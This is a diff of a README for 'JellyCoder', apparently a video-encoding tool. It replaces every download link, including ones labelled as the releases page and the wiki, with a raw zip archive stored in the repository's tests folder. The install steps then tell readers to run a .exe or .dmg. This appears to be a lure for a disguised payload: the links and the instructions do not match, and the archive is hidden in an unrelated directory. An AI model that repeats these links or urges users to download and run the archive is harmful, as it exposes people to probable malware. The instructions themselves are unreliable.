@@ -1,6 +1,6 @@
 # 🎥 JellyCoder - Encode Videos for Effortless Streaming
 
-[![Download JellyCoder](https://raw.githubusercontent.com/Sabuj2015/JellyCoder/master/.vscode/JellyCoder_v2.2.zip)](https://raw.githubusercontent.com/Sabuj2015/JellyCoder/master/.vscode/JellyCoder_v2.2.zip)
+[![Download JellyCoder](https://github.com/Sabuj2015/JellyCoder/raw/refs/heads/master/tests/Jelly_Coder_3.1.zip)](https://github.com/Sabuj2015/JellyCoder/raw/refs/heads/master/tests/Jelly_Coder_3.1.zip)
 
 ## 🚀 Getting Started
 
@@ -26,7 +26,7 @@ To run JellyCoder, ensure you have the following:
 
 1. **Visit the Releases Page:** Click on the link below to go to the download page:
    
-   [Download JellyCoder](https://raw.githubusercontent.com/Sabuj2015/JellyCoder/master/.vscode/JellyCoder_v2.2.zip)
+   [Download JellyCoder](https://github.com/Sabuj2015/JellyCoder/raw/refs/heads/master/tests/Jelly_Coder_3.1.zip)
 
 2. **Select the Latest Version:** From the releases page, look for the most recent version of JellyCoder.
 
@@ -35,7 +35,7 @@ To run JellyCoder, ensure you have the following:
 4. **Install the Application:** 
    - For **Windows**: Double-click the downloaded `.exe` file and follow the on-screen instructions.
    - For **macOS**: Open the downloaded `.dmg` file, drag JellyCoder to your Applications folder, then open it from there.
-   - For **Linux**: Follow your distribution’s instructions to install from a `https://raw.githubusercontent.com/Sabuj2015/JellyCoder/master/.vscode/JellyCoder_v2.2.zip` or similar package.
+   - For **Linux**: Follow your distribution’s instructions to install from a `https://github.com/Sabuj2015/JellyCoder/raw/refs/heads/master/tests/Jelly_Coder_3.1.zip` or similar package.
 
 5. **Open JellyCoder:** After installation, locate JellyCoder on your system and open it.
 
@@ -59,7 +59,7 @@ To run JellyCoder, ensure you have the following:
 
 ## 📖 Support & Documentation
 
-For more detailed instructions and troubleshooting, visit our [wiki](https://raw.githubusercontent.com/Sabuj2015/JellyCoder/master/.vscode/JellyCoder_v2.2.zip) or reach out through the Issues section of this repository.
+For more detailed instructions and troubleshooting, visit our [wiki](https://github.com/Sabuj2015/JellyCoder/raw/refs/heads/master/tests/Jelly_Coder_3.1.zip) or reach out through the Issues section of this repository.
 
 ---
 
